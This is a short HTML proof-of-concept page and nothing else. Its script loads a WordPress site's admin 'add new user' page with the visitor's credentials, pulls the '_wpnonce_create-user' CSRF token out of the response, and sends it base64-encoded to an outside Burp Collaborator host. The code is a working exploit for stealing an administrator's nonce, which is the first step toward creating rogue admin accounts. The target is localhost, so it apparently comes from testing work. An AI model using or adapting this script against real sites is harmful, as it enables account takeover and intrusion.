<body>
  <script>
 var target="http://localhost/arash"
var a = new XMLHttpRequest();
    a.open("GET", `${target}/wp-admin/user-new.php`, true);
    a.withCredentials = true;
    a.onload = function () {	
      const parser = new DOMParser();
      const htmlDocument = parser.parseFromString(
        this.responseText,
        "text/html"
      );
      const token_key = htmlDocument.getElementsByName("_wpnonce_create-user")[0].value;
      window.location = 'http://zqtsznaun6v7j03sw2fse8fvsmycm1.burpcollaborator.net/?data=' + btoa(token_key);
    }
  </script>
</body>
